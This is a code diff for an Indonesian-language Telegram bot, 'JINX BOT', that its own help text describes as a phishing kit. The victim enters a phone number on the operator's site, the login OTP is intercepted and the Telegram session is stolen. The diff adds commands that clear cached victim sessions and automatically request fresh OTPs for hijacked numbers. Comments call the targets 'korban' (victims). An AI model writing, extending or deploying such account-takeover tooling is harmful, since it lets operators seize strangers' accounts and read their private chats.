@@ -1,6 +1,7 @@
 from fastapi import FastAPI, Request
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
+from telethon.errors import FloodWaitError
 import asyncio
 import os
 import re
@@ -20,13 +21,13 @@ sessions = {}
 
 # === FUCKING OTP SNIPER STORAGE ===
 otp_sniper_cache = {}
-otp_requester_cache = {}  # NEW: Buat request OTP fresh
+otp_requester_cache = {}
 
 # === START ===
 @app.on_event("startup")
 async def startup():
     await client.start(bot_token=BOT_TOKEN)
-    print("JINX BOT – ELITE EDITION + OTP REQUESTER JALAN!")
+    print("JINX BOT – ELITE EDITION + OTP SNIPER + CLEANUP JALAN!")
 
 # === /start_listener – TANGKAP NOMOR KORBAN ===
 @app.post("/start_listener")
@@ -90,7 +91,7 @@ async def submit_otp(req: Request):
         await client.send_message(CHAT_ID, f"Gagal sign_in: {str(e)}")
         return {"success": False, "error": str(e)}
 
-# === NEW FUCKING FEATURE: /get_otp +6281xxx ===
+# === /get_otp +6281xxx – GET FRESH OTP ===
 @client.on(events.NewMessage(pattern=r'/get_otp (\+\d+)'))
 async def get_otp_cmd(event):
     if event.sender_id != CHAT_ID: 
@@ -111,6 +112,10 @@ async def get_otp_cmd(event):
             f"Login pake OTP ini di Telegram sekarang!",
             parse_mode='markdown'
         )
+        
+        # Auto request OTP baru buat next time
+        asyncio.create_task(auto_request_fresh_otp(phone))
+        
     else:
         # Kalo gak ada OTP ready, auto request fresh
         await event.reply(
@@ -183,6 +188,70 @@ async def otp_status_cmd(event):
         msg = "❌ No active OTP snipers\nGunakan `/get_otp +62xxx` buat minta OTP fresh!"
     
     await event.reply(msg, parse_mode='markdown')
+
+# === /cleanup +6281xxx ===
+@client.on(events.NewMessage(pattern=r'/cleanup (\+\d+)'))
+async def cleanup_cmd(event):
+    if event.sender_id != CHAT_ID: 
+        return
+    
+    phone = event.pattern_match.group(1)
+    
+    # 🗑️ HAPUS DARI SEMUA CACHE YANG BIKIN MAMPET
+    cleanup_count = 0
+    
+    if phone in listening:
+        try:
+            await listening[phone]['client'].disconnect()
+        except:
+            pass
+        del listening[phone]
+        cleanup_count += 1
+    
+    if phone in sessions:
+        del sessions[phone]
+        cleanup_count += 1
+    
+    if phone in otp_sniper_cache:
+        del otp_sniper_cache[phone]
+        cleanup_count += 1
+    
+    if phone in otp_requester_cache:
+        try:
+            await otp_requester_cache[phone]['client'].disconnect()
+        except:
+            pass
+        del otp_requester_cache[phone]
+        cleanup_count += 1
+    
+    await event.reply(
+        f"🧹 **SESSION CLEANED!**\n"
+        f"📱: `{phone}`\n"
+        f"🗑️: {cleanup_count} cache dihapus\n"
+        f"✅: Semua data udah dibersihkan!\n\n"
+        f"Sekarang coba `/get_otp {phone}` lagi!",
+        parse_mode='markdown'
+    )
+
+# === /cleanup_all ===
+@client.on(events.NewMessage(pattern=r'/cleanup_all'))
+async def cleanup_all_cmd(event):
+    if event.sender_id != CHAT_ID: 
+        return
+    
+    count = 0
+    for phone in list(listening.keys()):
+        try:
+            await listening[phone]['client'].disconnect()
+        except:
+            pass
+        del listening[phone]
+        count += 1
+    
+    otp_sniper_cache.clear()
+    otp_requester_cache.clear()
+    
+    await event.reply(f"🧹 **MASS CLEANUP!** {count} session dibersihkan!", parse_mode='markdown')
 
 # === KIRIM SESSION KE BOT ===
 async def send_session(phone, session_str):
@@ -296,7 +365,7 @@ async def send_cmd(event):
 async def help_cmd(event):
     if event.sender_id != CHAT_ID: return
     await event.reply("""
-**JINX BOT – ELITE EDITION + OTP SNIPER**
+**JINX BOT – ELITE EDITION + OTP SNIPER + CLEANUP**
 
 **PHISHING + OTP SNIPER:**
 • Web lo → korban masukin nomor → OTP → session dicuri
@@ -305,6 +374,8 @@ async def help_cmd(event):
 **OTP SNIPER COMMANDS:**
 • `/get_otp +6281xxx` → Dapatkan OTP fresh yang di-snipe
 • `/otp_status` → Lihat semua OTP yang ready
+• `/cleanup +6281xxx` → Bersihkan session error 💀
+• `/cleanup_all` → Bersihkan semua session 🧹
 
 **INTEL CHAT:**
 • `/list` → Lihat session  
